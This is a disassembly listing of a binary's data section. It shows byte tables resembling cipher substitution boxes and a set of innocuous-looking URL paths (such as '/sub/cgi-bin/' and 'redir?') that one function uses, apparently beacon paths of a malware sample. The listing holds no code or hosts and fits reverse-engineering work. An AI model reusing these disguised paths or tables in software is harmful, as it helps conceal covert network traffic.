                db    4
                db    4
                db    4
                db    4
                db    4
                db    5
                db    5
                db    5
                db    5
                db    5
                db    5
                db    5
                db    5
                db    5
                db    5
                db    5
                db    5
                db    5
                db    5
                db    5
                db    5
                db    5
                db    5
                db    5
                db    5
                db    5
                db    5
                db    5
                db    5
                db    5
                db    5
                db    5
                db    5
                db    5
                db    5
                db    5
                db    5
                db    5
                db    5
                db    5
                db    5
                db    5
                db    5
                db    5
                db    5
                db    5
                db    5
                db    5
                db    5
                db    5
                db    5
                db    5
                db    5
                db    5
                db    5
                db    5
                db    5
                db    5
                db    5
                db    5
                db    5
                db    5
                db    5
                db    5
                db    5
                db    5
                db    5
                db    5
                db    5
                db    6
                db    6
                db    6
                db    6
                db    6
                db    6
                db    6
                db    6
                db    6
                db    6
                db    6
                db    6
                db    6
                db    6
                db    6
                db    6
                db    6
                db    6
                db    6
                db    6
                db    6
                db    6
                db    6
                db    6
                db    6
                db    6
                db    6
                db    6
                db    6
                db    6
                db    6
                db    6
                db    6
                db    6
                db    6
                db    6
                db    6
                db    6
                db    6
                db    6
                db    6
                db    6
                db    6
                db    6
                db    6
                db    6
                db    6
                db    6
                db    7
                db    7
                db    7
                db    7
                db    7
                db    7
                db    7
                db    7
                db    7
                db    7
                db    7
                db    7
                db    7
                db    7
                db    7
                db    7
                db    7
                db    7
                db    7
                db    7
                db    7
                db    7
                db    7
                db    7
                db    7
                db    7
                db    7
                db    7
                db    7
                db    7
                db    7
                db    7
                db    7
                db    7
                db    7
                db    7
                db    7
                db    7
                db    7
                db    7
                db    7
                db    7
                db    7
                db    7
                db    7
                db    7
                db    7
                db    7
                db    8
                db    8
                db    8
                db    8
                db    8
                db    8
                db    8
                db    8
                db    8
                db    8
                db    8
                db    8
                db    8
                db    8
                db    8
                db    8
byte_426600     db 20h                  ; DATA XREF: sub_40C190+BA↑r
byte_426601     db 3Ah                  ; DATA XREF: sub_40C190+C9↑r
byte_426602     db 66h                  ; DATA XREF: sub_40C190+D8↑r
byte_426603     db 35h                  ; DATA XREF: sub_40C190+E7↑r
byte_426604     db 1Bh                  ; DATA XREF: sub_40C190+7E↑r
byte_426605     db 34h                  ; DATA XREF: sub_40C190+8D↑r
byte_426606     db 5Eh                  ; DATA XREF: sub_40C190+9C↑r
byte_426607     db 2Dh                  ; DATA XREF: sub_40C190+AB↑r
                db 0FFh ; ÿ
                db    0
                db    0
                db    0
                dd offset aBadAllocation ; "bad allocation"
byte_426610     db 8Ah                  ; DATA XREF: .text:00403428↑r
                                        ; sub_404660+58↑r ...
                db 0E7h ; ç
                db 0D6h ; Ö
                db  5Bh ; [
                db 0E9h ; é
                db 0ECh ; ì
                db  12h
                db 0BBh ; »
                db 0C1h ; Á
                db 0F2h ; ò
                db  80h ; €
                db  61h ; a
                db 0C5h ; Å
                db  3Eh ; >
                db  0Dh
                db 0C9h ; É
                db 0E2h ; â
                db 0ABh ; «
                db  7Fh ; 
                db  8Fh
                db  39h ; 9
                db  4Ch ; L
                db 0F6h ; ö
                db  92h ; ’
                db  66h ; f
                db 0DDh ; Ý
                db  68h ; h
                db 0C8h ; È
                db    8
                db 0FBh ; û
                db 0D0h ; Ð
                db  3Fh ; ?
                db 0E1h ; á
                db 0D3h ; Ó
                db  67h ; g
                db 0C2h ; Â
                db 0B6h ; ¶
                db  45h ; E
                db 0FAh ; ú
                db  55h ; U
                db  48h ; H
                db  89h ; ‰
                db  11h
                db  79h ; y
                db 0D5h ; Õ
                db  19h
                db  4Bh ; K
                db 0F5h ; õ
                db 0B4h ; ´
                db 0B7h ; ·
                db 0ADh ; ­
                db 0B2h ; ²
                db    3
                db  99h ; ™
                db 0BDh ; ½
                db  6Ah ; j
                db  22h ; "
                db 0E6h ; æ
                db 0DAh ; Ú
                db 0F8h ; ø
                db  0Ah
                db 0DBh ; Û
                db 0CBh ; Ë
                db  56h ; V
                db 0D4h ; Ô
                db    0
                db 0CCh ; Ì
                db 0AAh ; ª
                db  23h ; #
                db  91h ; ‘
                db  5Fh ; _
                db  5Ah ; Z
                db  3Ah ; :
                db  1Ch
                db  0Eh
                db  7Ah ; z
                db  14h
                db  36h ; 6
                db  49h ; I
                db  59h ; Y
                db 0C4h ; Ä
                db  94h ; ”
                db  85h ; …
                db  18h
                db 0E5h ; å
                db  15h
                db  9Ch ; œ
                db  2Eh ; .
                db  62h ; b
                db  78h ; x
                db  27h ; '
                db  1Ah
                db 0EDh ; í
                db  93h ; “
                db 0FEh ; þ
                db 0CEh ; Î
                db 0F7h ; ÷
                db  87h ; ‡
                db  2Bh ; +
                db  90h
                db 0B0h ; °
                db 0DFh ; ß
                db  25h ; %
                db  1Eh
                db  74h ; t
                db  8Eh ; Ž
                db 0F1h ; ñ
                db  6Eh ; n
                db 0E4h ; ä
                db 0A1h ; ¡
                db 0BAh ; º
                db  26h ; &
                db  0Bh
                db 0CFh ; Ï
                db 0D9h ; Ù
                db  2Fh ; /
                db  46h ; F
                db 0BFh ; ¿
                db  52h ; R
                db  82h ; ‚
                db  38h ; 8
                db  1Dh
                db  81h
                db  83h ; ƒ
                db  16h
                db  98h ; ˜
                db 0F9h ; ù
                db 0B9h ; ¹
                db  0Ch
                db 0C7h ; Ç
                db  9Fh ; Ÿ
                db    2
                db  9Bh ; ›
                db 0EAh ; ê
                db  4Ah ; J
                db  7Ch ; |
                db  9Ah ; š
                db  7Dh ; }
                db  65h ; e
                db  73h ; s
                db  70h ; p
                db  5Ch ; \
                db 0CAh ; Ê
                db  40h ; @
                db 0A0h ;  
                db  72h ; r
                db 0E0h ; à
                db  0Fh
                db 0EFh ; ï
                db  71h ; q
                db  8Dh
                db  35h ; 5
                db  51h ; Q
                db  53h ; S
                db  63h ; c
                db 0AEh ; ®
                db    1
                db  4Dh ; M
                db 0E3h ; ã
                db 0CDh ; Í
                db  2Ah ; *
                db 0D2h ; Ò
                db  24h ; $
                db  5Dh ; ]
                db 0FDh ; ý
                db 0A4h ; ¤
                db  31h ; 1
                db  58h ; X
                db  5Eh ; ^
                db  28h ; (
                db  6Ch ; l
                db 0A3h ; £
                db  2Ch ; ,
                db 0B3h ; ³
                db 0C3h ; Ã
                db  43h ; C
                db    7
                db  77h ; w
                db  9Eh ; ž
                db 0F4h ; ô
                db  13h
                db 0EBh ; ë
                db  6Dh ; m
                db  88h ; ˆ
                db 0D8h ; Ø
                db 0A2h ; ¢
                db 0BEh ; ¾
                db  4Fh ; O
                db 0A7h ; §
                db 0C6h ; Æ
                db  32h ; 2
                db  7Eh ; ~
                db  6Fh ; o
                db  9Dh
                db  4Eh ; N
                db 0C0h ; À
                db  95h ; •
                db 0D7h ; ×
                db 0BCh ; ¼
                db 0B1h ; ±
                db  30h ; 0
                db 0EEh ; î
                db  57h ; W
                db  6Bh ; k
                db  75h ; u
                db  34h ; 4
                db  69h ; i
                db 0DEh ; Þ
                db  44h ; D
                db    5
                db  76h ; v
                db 0FCh ; ü
                db 0F0h ; ð
                db  64h ; d
                db  41h ; A
                db 0A5h ; ¥
                db  54h ; T
                db  60h ; `
                db  3Ch ; <
                db  50h ; P
                db  1Fh
                db  20h
                db  97h ; —
                db 0A8h ; ¨
                db  37h ; 7
                db    4
                db  21h ; !
                db 0FFh ; ÿ
                db    6
                db  17h
                db 0DCh ; Ü
                db 0AFh ; ¯
                db 0A9h ; ©
                db    9
                db  42h ; B
                db 0D1h ; Ñ
                db 0B5h ; µ
                db  8Bh ; ‹
                db  3Bh ; ;
                db  2Dh ; -
                db 0ACh ; ¬
                db  47h ; G
                db  8Ch ; Œ
                db  86h ; †
                db  3Dh ; =
                db  29h ; )
                db 0B8h ; ¸
                db  84h ; „
                db  10h
                db  7Bh ; {
                db  96h ; –
                db 0A6h ; ¦
                db  1Bh
                db 0E8h ; è
                db  33h ; 3
                db 0F3h ; ó
byte_426710     db 41h                  ; DATA XREF: sub_4046F0+64↑r
                                        ; sub_404BF0+135↑r
                db  9Ch ; œ
                db  83h ; ƒ
                db  34h ; 4
                db 0E1h ; á
                db 0D1h ; Ñ
                db 0E4h ; ä
                db 0B0h ; °
                db  1Ch
                db 0E9h ; é
                db  3Ch ; <
                db  70h ; p
                db  80h ; €
                db  0Eh
                db  4Ah ; J
                db  93h ; “
                db 0F8h ; ø
                db  2Ah ; *
                db    6
                db 0B4h ; ´
                db  4Ch ; L
                db  55h ; U
                db  7Ch ; |
                db 0E5h ; å
                db  53h ; S
                db  2Dh ; -
                db  5Bh ; [
                db 0FCh ; ü
                db  49h ; I
                db  79h ; y
                db  67h ; g
                db 0DCh ; Ü
                db 0DDh ; Ý
                db 0E2h ; â
                db  38h ; 8
                db  44h ; D
                db 0A2h ; ¢
                db  66h ; f
                db  6Fh ; o
                db  5Ah ; Z
                db 0A9h ; ©
                db 0F5h ; õ
                db 0A0h ;  
                db  62h ; b
                db 0ACh ; ¬
                db 0EFh ; ï
                db  57h ; W
                db  73h ; s
                db 0C8h ; È
                db 0A6h ; ¦
                db 0BEh ; ¾
                db 0FEh ; þ
                db 0CDh ; Í
                db  97h ; —
                db  4Dh ; M
                db 0E0h ; à
                db  78h ; x
                db  14h
                db  48h ; H
                db 0EEh ; î
                db 0DAh ; Ú
                db 0F4h ; ô
                db  0Dh
                db  1Fh
                db  8Fh
                db 0D6h ; Ö
                db 0EAh ; ê
                db 0AFh ; ¯
                db 0D0h ; Ð
                db  25h ; %
                db  74h ; t
                db 0F1h ; ñ
                db  28h ; (
                db  4Eh ; N
                db  86h ; †
                db  2Eh ; .
                db  15h
                db  9Dh
                db 0C2h ; Â
                db 0BBh ; »
                db 0DBh ; Û
                db  98h ; ˜
                db  76h ; v
                db  99h ; ™
                db 0D8h ; Ø
                db  27h ; '
                db  3Fh ; ?
                db 0CAh ; Ê
                db 0A7h ; §
                db  4Fh ; O
                db  47h ; G
                db    3
                db  8Dh
                db 0A3h ; £
                db 0A8h ; ¨
                db  46h ; F
                db 0D9h ; Ù
                db  0Bh
                db  58h ; X
                db  9Ah ; š
                db 0D5h ; Õ
                db  8Ah ; Š
                db  18h
                db  22h ; "
                db  1Ah
                db 0CEh ; Î
                db  37h ; 7
                db 0CBh ; Ë
                db 0AAh ; ª
                db 0B6h ; ¶
                db  6Bh ; k
                db 0C0h ; À
                db  8Ch ; Œ
                db  95h ; •
                db  91h ; ‘
                db  8Bh ; ‹
                db  68h ; h
                db 0CCh ; Ì
                db 0D2h ; Ò
                db 0B1h ; ±
                db  59h ; Y
                db  2Bh ; +
                db  4Bh ; K
                db 0F9h ; ù
                db  87h ; ‡
                db  89h ; ‰
                db 0BFh ; ¿
                db  12h
                db  0Ah
                db  7Ah ; z
                db  77h ; w
                db  7Bh ; {
                db 0F7h ; ÷
                db  52h ; R
                db 0F3h ; ó
                db  61h ; a
                db 0B7h ; ·
                db  29h ; )
                db    0
                db 0EDh ; í
                db 0F2h ; ò
                db  96h ; –
                db  69h ; i
                db  13h
                db  63h ; c
                db  45h ; E
                db  17h
                db  5Dh ; ]
                db  51h ; Q
                db 0C4h ; Ä
                db 0FAh ; ú
                db 0DEh ; Þ
                db  7Dh ; }
                db  35h ; 5
                db  88h ; ˆ
                db  84h ; „
                db  56h ; V
                db 0C1h ; Á
                db 0B2h ; ²
                db  82h ; ‚
                db  90h
                db  6Dh ; m
                db 0B9h ; ¹
                db 0ABh ; «
                db 0A5h ; ¥
                db 0D7h ; ×
                db 0FBh ; û
                db 0BCh ; ¼
                db 0DFh ; ß
                db 0E8h ; è
                db  43h ; C
                db  11h
                db 0F0h ; ð
                db  32h ; 2
                db  9Bh ; ›
                db 0E7h ; ç
                db  64h ; d
                db 0C7h ; Ç
                db  33h ; 3
                db 0ADh ; ­
                db  30h ; 0
                db 0ECh ; ì
                db  24h ; $
                db  31h ; 1
                db 0F6h ; ö
                db  7Fh ; 
                db  6Eh ; n
                db    7
                db 0C6h ; Æ
                db  36h ; 6
                db 0BAh ; º
                db  75h ; u
                db 0C3h ; Ã
                db    8
                db  23h ; #
                db 0AEh ; ®
                db  50h ; P
                db  0Ch
                db 0BDh ; ½
                db  81h
                db  1Bh
                db  0Fh
                db  8Eh ; Ž
                db  3Eh ; >
                db  42h ; B
                db  9Fh ; Ÿ
                db  5Fh ; _
                db  71h ; q
                db  1Eh
                db 0EBh ; ë
                db 0A1h ; ¡
                db  21h ; !
                db  40h ; @
                db  2Ch ; ,
                db    2
                db 0C5h ; Å
                db 0B8h ; ¸
                db  72h ; r
                db  3Ah ; :
                db  3Dh ; =
                db 0E6h ; æ
                db  19h
                db 0CFh ; Ï
                db  65h ; e
                db  92h ; ’
                db  20h
                db  10h
                db  9Eh ; ž
                db  6Ch ; l
                db  54h ; T
                db  39h ; 9
                db    1
                db 0FDh ; ý
                db    4
                db  85h ; …
                db 0B5h ; µ
                db    5
                db  5Ch ; \
                db 0C9h ; É
                db  94h ; ”
                db 0D4h ; Ô
                db  6Ah ; j
                db    9
                db 0FFh ; ÿ
                db 0B3h ; ³
                db  2Fh ; /
                db  16h
                db  60h ; `
                db  3Bh ; ;
                db  7Eh ; ~
                db  26h ; &
                db  1Dh
                db 0D3h ; Ó
                db 0A4h ; ¤
                db  5Eh ; ^
                db 0E3h ; ã
aBlg78newtplIma db '/blg7_8newtpl/image/7/7_12/images/',0
                                        ; DATA XREF: sub_404110+6↑o
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
aWidgetWidgetsW db '/widget/widgets/wgt_static/',0
                                        ; DATA XREF: sub_404110+18↑o
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
aSLcmsIddT      db '/s/lcms_/IDD/t/',0  ; DATA XREF: sub_404110+2A↑o
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
aStatusMutiquer db '/status/MutiqueryVP/',0
                                        ; DATA XREF: sub_404110+3C↑o
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
aApiGetAttentio db '/api/get_attention_num/',0
                                        ; DATA XREF: sub_404110+4E↑o
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
aUcMyshowBlogMi db '/uc/myshow/blog/misc/gif/',0
                                        ; DATA XREF: sub_404110+60↑o
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
aA2FrontLmMiniN db '/A2/front/lm/mini/noborder/',0
                                        ; DATA XREF: sub_404110+72↑o
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
aSubCgiBin      db '/sub/cgi-bin/',0    ; DATA XREF: sub_404110+84↑o
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
aSheqPorBlomofu db '/sheq/por/blomofun/',0
                                        ; DATA XREF: sub_404110+96↑o
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
aComboActionBin db '/combo.action/bin/',0
                                        ; DATA XREF: sub_404110+A8↑o
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
aPpCoreCgi      db '/pp/core/cgi/',0    ; DATA XREF: sub_404110+BA↑o
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
aLoaDatabase3   db '/loa/database3/',0  ; DATA XREF: sub_404110+CC↑o
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
aRedir          db 'redir?',0           ; DATA XREF: sub_404110+1↑o
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  70h ; p
                db  72h ; r
                db  64h ; d
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
